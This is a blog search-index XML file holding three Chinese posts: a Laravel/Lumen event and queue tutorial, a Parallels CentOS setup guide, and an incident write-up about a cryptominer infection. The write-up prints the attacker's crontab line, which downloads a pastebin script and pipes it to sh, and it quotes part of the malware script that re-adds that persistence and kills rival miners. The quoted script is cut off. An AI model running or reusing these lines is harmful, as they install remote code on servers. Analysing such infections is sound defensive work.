<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Laravel事件</title>
      <link href="/2019/03/16/PHP/laravel-event/"/>
      <url>/2019/03/16/PHP/laravel-event/</url>
      
        <content type="html"><![CDATA[<p>Laravel 事件使用.</p><blockquote><p>常用于与主流程无关的功能,如注册短信,下单通知等功能.</p><p>分为同步和异步功能.lumen的事件和队列与laravel一至,由于lumen缺少自动命令.可以使用laravel命令创建完成再复制到lumen下.</p></blockquote><h2 id="同步事件"><a href="#同步事件" class="headerlink" title="同步事件"></a>同步事件</h2><h3 id="1-打开app事件注册的配置"><a href="#1-打开app事件注册的配置" class="headerlink" title="1.打开app事件注册的配置"></a>1.打开app事件注册的配置</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文件 /bootstrap/app.php</span></span><br><span class="line">$app-&gt;register(App\Providers\EventServiceProvider::class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 应需要序列化model,需要修改.env 的APP_KEY 为类似base64:59KCzr0MWDGz0fHhOJXeN+yurJw5SBWTXiqJjul7xlE=</span></span><br><span class="line"><span class="comment">// 可以使用 laravel命令生成.</span></span><br><span class="line">php artisan key:generate</span><br></pre></td></tr></table></figure><h3 id="2-新建事件"><a href="#2-新建事件" class="headerlink" title="2.新建事件"></a>2.新建事件</h3><blockquote><p>由于lumen没有命令直接创建事件,只能手动创建.</p></blockquote><p>如订单事件</p><p>在/app/Events 目录下创建OrderEvent.php类.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Events</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Events</span>\<span class="title">Event</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Queue</span>\<span class="title">SerializesModels</span>;<span class="comment">//序列化类</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderEvent</span> <span class="keyword">extends</span> <span class="title">Event</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">use</span> <span class="title">SerializesModels</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> $orderModel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Create a new event instance.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> Order $orderModel</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(Order $orderModel)</span>//事件传参</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;orderModel = $orderModel;<span class="comment">//初始化事件类</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-编写事件监听器"><a href="#3-编写事件监听器" class="headerlink" title="3. 编写事件监听器"></a>3. 编写事件监听器</h3><p>在/App/Listenters下,创建事件监听类.加后缀Listener</p><p>如:OrderListenter</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Listeners</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Events</span>\<span class="title">OrderEvent</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestListener</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理事件方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">(OrderEvent $event)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"TestListener"</span>;</span><br><span class="line">$orderModel= event-&gt;OrderModel;</span><br><span class="line"><span class="comment">// 开始处理事件,如发送短信</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-绑定事件和监听器"><a href="#4-绑定事件和监听器" class="headerlink" title="4. 绑定事件和监听器"></a>4. 绑定事件和监听器</h3><p>在 /app/Providers 目录下,新建EventServiceProvider.php类</p><p>在listen数组下,新建 鍵:事件名 值:监听者</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Providers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Laravel</span>\<span class="title">Lumen</span>\<span class="title">Providers</span>\<span class="title">EventServiceProvider</span> <span class="title">as</span> <span class="title">ServiceProvider</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EventServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 事件监听者</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">protected</span> $listen = [</span><br><span class="line"><span class="comment">// 订单变更事件</span></span><br><span class="line"><span class="string">'App\Events\OrderEvent'</span> =&gt; [</span><br><span class="line"><span class="string">'App\Listeners\OrderListener'</span>,<span class="comment">//监听器,可以有多个</span></span><br><span class="line">]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 事件订阅者</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">protected</span> $subscribe = [</span><br><span class="line"></span><br><span class="line">];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-触发事件"><a href="#4-触发事件" class="headerlink" title="4. 触发事件"></a>4. 触发事件</h3><p>可以在控制器中或model中使用.</p><p>使用event(new OrderEvent())或Event::fire(new OrderEvent());</p><p>如我OrderModel中使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Library</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Events</span>\<span class="title">OrderEvent</span>; <span class="comment">//引用事件</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 订购单</span></span><br><span class="line"><span class="comment">* Class Order</span></span><br><span class="line"><span class="comment">* <span class="doctag">@package</span> App\Http\Model</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Order</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">boot</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">parent</span>::boot();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 订单创建完</span></span><br><span class="line"><span class="keyword">static</span>::created(<span class="function"><span class="keyword">function</span> <span class="params">($model)</span> </span>&#123;</span><br><span class="line">event(<span class="keyword">new</span> OrderEvent($model));<span class="comment">// 触发事件</span></span><br><span class="line"><span class="comment">//Event::fire(new OrderEvent());</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 订单更新</span></span><br><span class="line"><span class="keyword">static</span>::updated(<span class="function"><span class="keyword">function</span> <span class="params">($model)</span> </span>&#123;</span><br><span class="line">event(<span class="keyword">new</span> OrderEvent($model));<span class="comment">// 触发事件</span></span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="异步队列"><a href="#异步队列" class="headerlink" title="异步队列"></a>异步队列</h2><blockquote><p>以上是使用同步方式调用事件,但有些耗时的工作需要在后台异步执行.比如短信,邮件通知等,把事件放到队列执行.需要配置异步队列.下面使用redis快速配置异步队列.</p></blockquote><h3 id="1-配置队列"><a href="#1-配置队列" class="headerlink" title="1.配置队列"></a>1.配置队列</h3><p>复制文件/vendor/laravel/lumen-framework/config/queue.php到/app/config/queue.php 下.</p><p>修改.env 加 QUEUE_DRIVER=redis</p><h3 id="2-修改事件监听器类型"><a href="#2-修改事件监听器类型" class="headerlink" title="2. 修改事件监听器类型"></a>2. 修改事件监听器类型</h3><p>把Listenter改成队列模式.</p><p>如OrderLisnter</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Listeners</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Events</span>\<span class="title">TestEvent</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Contracts</span>\<span class="title">Queue</span>\<span class="title">ShouldQueue</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Queue</span>\<span class="title">InteractsWithQueue</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderListener</span> <span class="keyword">implements</span> <span class="title">ShouldQueue</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">use</span> <span class="title">InteractsWithQueue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">(OrderEvent $event)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"TestListener"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-调用"><a href="#3-调用" class="headerlink" title="3. 调用"></a>3. 调用</h3><p>和普通 事件一样.</p><h3 id="4-配置队列消费"><a href="#4-配置队列消费" class="headerlink" title="4. 配置队列消费"></a>4. 配置队列消费</h3><p>后台监听命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># --daemon=不重启框架 --sleep=无任务睡眠时间秒 --tries=失败重试</span></span><br><span class="line">php artisan queue:work connection --daemon --sleep=3 --tries=3</span><br></pre></td></tr></table></figure><h3 id="5-使用supervisor后台监控"><a href="#5-使用supervisor后台监控" class="headerlink" title="5. 使用supervisor后台监控"></a>5. 使用supervisor后台监控</h3><blockquote><p>使用后台监控程序</p></blockquote><ul><li>安装supervisor,linux 环境</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">yum install supervisor</span><br><span class="line"><span class="comment"># mac 安装</span></span><br><span class="line">brew install supervisor</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置文件</span></span><br><span class="line">/etc/supervisor/</span><br><span class="line">或在mac /usr/<span class="built_in">local</span>/etc/supervisord.ini</span><br><span class="line"></span><br><span class="line"><span class="comment">#脚本配置文件</span></span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/etc/supervisor.d/</span><br><span class="line"></span><br><span class="line"><span class="comment">#新建laravel 脚本配置 laravel-worker.conf &amp;&amp; laravel-worker.ini</span></span><br><span class="line"></span><br><span class="line">[program:laravel-worker]</span><br><span class="line">process_name=%(program_name)s_%(process_num)02d</span><br><span class="line">⌘=php /Users/arkin/PhpstormProjects/cisscool/cisscool-api/artisan queue:work --sleep=3 --tries=3 --daemon</span><br><span class="line">autostart=<span class="literal">true</span></span><br><span class="line">autorestart=<span class="literal">true</span></span><br><span class="line">user=arkin</span><br><span class="line">numprocs=8</span><br><span class="line">redirect_stderr=<span class="literal">true</span></span><br><span class="line">stdout_logfile=/data/logs/ciss/work.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line">sudo supervisord -c /etc/supervisor/supervisord.conf</span><br><span class="line">sudo supervisorctl -c /etc/supervisor/supervisord.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># CI发布完成后执行:</span></span><br><span class="line">sudo supervisorctl reread</span><br><span class="line">sudo supervisorctl update</span><br><span class="line">sudo supervisorctl start laravel-worker:*</span><br></pre></td></tr></table></figure><h3 id="6-建立失败数据库"><a href="#6-建立失败数据库" class="headerlink" title="6.建立失败数据库"></a>6.建立失败数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`failed_jobs`</span> (</span><br><span class="line"><span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">10</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line"><span class="string">`connection`</span> <span class="built_in">text</span> <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`queue`</span> <span class="built_in">text</span> <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`payload`</span> longtext <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`exception`</span> longtext <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`failed_at`</span> <span class="keyword">timestamp</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">CURRENT_TIMESTAMP</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> AUTO_INCREMENT=<span class="number">4</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 <span class="keyword">COLLATE</span>=utf8_unicode_ci ROW_FORMAT=<span class="keyword">COMPACT</span></span><br></pre></td></tr></table></figure><p>到此基于队列的事件监听可以正常使用了.</p><p>队列的详细使用,事件的分发广播.参考下一篇.</p>]]></content>
      
      
      <categories>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Laravel </tag>
            
            <tag> Php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Parallels Centos 安装</title>
      <link href="/2019/03/13/DevOps/2019-03-13/"/>
      <url>/2019/03/13/DevOps/2019-03-13/</url>
      
        <content type="html"><![CDATA[<h1 id="parallels-安装-centos"><a href="#parallels-安装-centos" class="headerlink" title="parallels 安装 centos"></a>parallels 安装 centos</h1><p>parallels 是 MacOs下的一个虚拟化工具,和Mac整合得很好.<br>支持融入模式,macos和虚拟机结合,虚拟机配置都默认帮配置完成了.文件共享.剪贴板工具都帮安好.就像安装软件一样方便.</p><h2 id="root密码"><a href="#root密码" class="headerlink" title="root密码"></a>root密码</h2><p>默认创建一个parallels账号,登录的也是parallels.<br>没有初始化root密码.<br>修改root密码:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd</span><br></pre></td></tr></table></figure></p><p>然后输入 当前parallels账号的密码<br><img src="http://img.hi-arkin.com/2019-03-13-15524712150526.jpg" alt=""></p><p>然后就可以修改 root密码了.</p><p><img src="http://img.hi-arkin.com/2019-03-13-15524712756831.jpg" alt=""></p><h2 id="配置免密连接"><a href="#配置免密连接" class="headerlink" title="配置免密连接"></a>配置免密连接</h2><p>避免手动配置麻烦,只需要两步就完成.</p><p>第一步: 打开配置<br><img src="http://img.hi-arkin.com/2019-03-13-15524716496509.jpg" alt=""></p><p>第二步: 选中 “使用macOS SSH 公钥进行身份验证”</p><p><img src="http://img.hi-arkin.com/2019-03-13-15524715842849.jpg" alt=""></p><p>这样便把mac电脑当前的ssh key复制到 centos 中 parallels 用户的 ~/.ssh/authorized_keys里面.<br>我们验证一下.</p><p><img src="http://img.hi-arkin.com/2019-03-13-15524718469480.jpg" alt=""></p><p>测试一下远程连接.<br>“ssh <a href="mailto:parallels@10.211.55.4" target="_blank" rel="noopener">parallels@10.211.55.4</a>“是centos虚拟机的IP.<br><img src="http://img.hi-arkin.com/2019-03-13-15524719083241.jpg" alt=""></p><p>就可以使用mac自带的命令行工具了.</p><h2 id="parallels-显示模式"><a href="#parallels-显示模式" class="headerlink" title="parallels 显示模式"></a>parallels 显示模式</h2><p>有三种查看模式</p><ul><li>融合: 与macOS合并,虚拟机运行的程序和Mac一样运行.</li><li>全屏: 普通的虚拟机模式</li><li>画中画: 把虚拟机当成单独Mac应用,就像看视频一样,可以无限缩小.放大</li></ul><p><strong>旅行模式</strong>: 相当于节能模式,Linux最好开启这种模式.<br>减少磁盘 “嗡嗡~”吵个不停.</p><p><strong>后台运行模式</strong>: linux大部分情况不需要界面,只需要在后台运行可以了.<br>关闭后就虚拟机还能运行.<br><img src="http://img.hi-arkin.com/2019-03-13-15524740034541.jpg" alt=""></p><h2 id="静态IP"><a href="#静态IP" class="headerlink" title="静态IP"></a>静态IP</h2><p>虚拟机默认使用动态IP,这样我们使用ssh连接时,不方便.<br>可以修改网卡设置成固定IP.</p>]]></content>
      
      
      <categories>
          
          <category> DevOps </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MacOS </tag>
            
            <tag> parallels </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次比特币病毒木马事件</title>
      <link href="/2019/03/08/DevOps/xmrig_script/"/>
      <url>/2019/03/08/DevOps/xmrig_script/</url>
      
        <content type="html"><![CDATA[<h1 id="记一次比特币病毒木马事件"><a href="#记一次比特币病毒木马事件" class="headerlink" title="记一次比特币病毒木马事件"></a>记一次比特币病毒木马事件</h1><p>这两天开发同事突然反应代码无法上线,经排查是阿里云服务器不能正常git pull 代码.</p><p>开始排查.记录如下.</p><h2 id="排查git"><a href="#排查git" class="headerlink" title="排查git"></a>排查git</h2><p>第一感觉就是可能git问题,代码冲突.</p><ul><li>1.手动pull<br><img src="http://img.hi-arkin.com/2019-03-08-15520447629844.jpg" alt=""></li></ul><p>结果 :连接超时.</p><ul><li><p>2.ping git.xxx.com<br>git.xxx.com 我们自建的git服务器,<br><img src="http://img.hi-arkin.com/2019-03-08-15520449391001.jpg" alt=""><br>结果:git服务器正常.<br>百思不得骑姐,本地git正常使用,其它服务器也正常使用.为什么从这台服务器访问不了22端口呢?<br>考虑: 1,被git服务器防火墙加黑名单;2,这两天阿里云服务器抽风.<br>主观直觉都是把坑扔给别人,谁让你们阿里云可用9999的.</p></li><li><p>3.排查git服务器<br>关闭访问墙,查看黑名单都没有异常.因为git服务器是自建在内网.<br>怀疑是联通又把我们的端口封了,这种事经常有.<br>但使用外网其它服务器访问,都正常.所有把联通排除了.<br>结论: git服务器正常.</p></li></ul><h2 id="所有矛头都指向了阿里云"><a href="#所有矛头都指向了阿里云" class="headerlink" title="所有矛头都指向了阿里云"></a>所有矛头都指向了阿里云</h2><p>但在前一台晚上,重启一下服务器,竟然正常了.<br>你说,阿里不背这个锅,谁背.<br>今天也出问题了,也同样重启,发现不好使.<br>想前几天阿里云监控报警短信,可能我们的服务器真的出问题了.<br>第一感觉,我们没问题,是配置出问题了.于是乎,打开安全配置.</p><p><img src="http://img.hi-arkin.com/2019-03-08-15520461792643.jpg" alt=""><br>公网出,全OK.<br>才想起来看消息,通知.<br><img src="http://img.hi-arkin.com/2019-03-08-15520464024156.jpg" alt=""><br>妈呀,这是要炸啊!打开其中一条.<br><img src="http://img.hi-arkin.com/2019-03-08-15520458650218.jpg" alt=""><br>阿里云把我们的对外22端口屏蔽了.怪不得安全设置都各种没有发现问题.原来是我们服务器在攻击了别人呀.<br>就是中病毒了呗.</p><h2 id="查毒"><a href="#查毒" class="headerlink" title="查毒"></a>查毒</h2><p>进入服务器,病毒或木马最喜欢做的一件事,写定时脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure></p><p>妈呀,一条自动任务,在下载脚本运行呐<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/15 * * * * (curl -fsSL https://pastebin.com/raw/yPRSa0ki||wget -q -O- https://pastebin.com/raw/yPRSa0ki)|sh</span><br></pre></td></tr></table></figure></p><p><img src="http://img.hi-arkin.com/2019-03-08-15520466504218.jpg" alt=""></p><ul><li>先看文件是啥<br><img src="http://img.hi-arkin.com/2019-03-08-15520467519052.jpg" alt=""><br>又下载另一个脚本,脚本内容长这样子</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin:/usr/bin:/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"*/10 * * * * (curl -fsSL https://pastebin.com/raw/yPRSa0ki||wget -q -O- https://pastebin.com/raw/yPRSa0ki)|sh"</span> | crontab -</span><br><span class="line"></span><br><span class="line">ps -ef|grep -v grep|grep hwlh3wlh44lh|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep Circle_MI|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep get.bi-chi.com|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep hashvault.pro|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep nanopool.org|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep /usr/bin/.sshd|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep /usr/bin/bsd-port|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"xmr"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"xig"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"ddgs"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"qW3xT"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"wnTKYg"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"t00ls.ru"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"sustes"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"thisxxs"</span>|awk <span class="string">'&#123;print $2&#125;'</span> | xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span 